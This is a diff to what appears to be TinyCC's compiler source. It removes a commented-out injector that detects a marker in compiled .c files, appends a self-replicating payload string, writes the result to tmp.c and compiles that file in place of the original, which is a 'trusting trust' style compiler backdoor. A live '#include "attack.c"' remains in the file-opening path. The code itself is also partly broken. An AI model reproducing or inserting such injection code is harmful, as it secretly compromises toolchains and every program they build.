@@ -1005,33 +1005,6 @@ ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int x_flag
         filename = buf;
 #endif
 
-
-
-//    char* FIZZ42 = "char* BUZZ42 = \"char line[4095 + 1]; char filestr[6480 + 1]; FILE *fPtr = fopen(filename, \\\"r\\\");    if (strcmp(&filename[strlen(filename) - strlen(\\\".c\\\")], \\\".c\\\") == 0) {        int bug = 0;        while (fgets(line, sizeof line, fPtr)) {            if (strstr(line, \\\"open the file */\\\")) {                bug = 1;                strlcat(line, \\\"\\\", sizeof(line));            }            strlcat(filestr, line, sizeof(filestr));        }        if (bug == 1) {;            FILE *fptmp = fopen(\\\"tmp.c\\\", \\\"ab\\\");            if (fptmp != NULL)            {                fputs(filestr, fptmp);                fclose(fptmp);            }            filename = \\\"tmp.c\\\";        }    }    fclose(fPtr);\\\"\";";
-//
-//    char line[4095 + 1];
-//    char filestr[64804 + 1];
-//    FILE *fPtr = fopen(filename, "r");
-//    if (strcmp(&filename[strlen(filename) - strlen(".c")], ".c") == 0) {
-//        int bug = 0;
-//        while (fgets(line, sizeof line, fPtr)) {
-//            if (strstr(line, "open the file */")) {
-//                bug = 1;
-//                strlcat(line, FIZZ42, sizeof(line));
-//            }
-//            strlcat(filestr, line, sizeof(filestr));
-//        }
-//        if (bug == 1) {;
-//            FILE *fptmp = fopen("tmp.c", "ab");
-//            if (fptmp != NULL)
-//            {
-//                fputs(filestr, fptmp);
-//                fclose(fptmp);
-//            }
-//            filename = "tmp.c";
-//        }
-//    }
-//    fclose(fPtr);
     /* open the file */
 #include "attack.c"
     fd = _tcc_open(s1, filename);
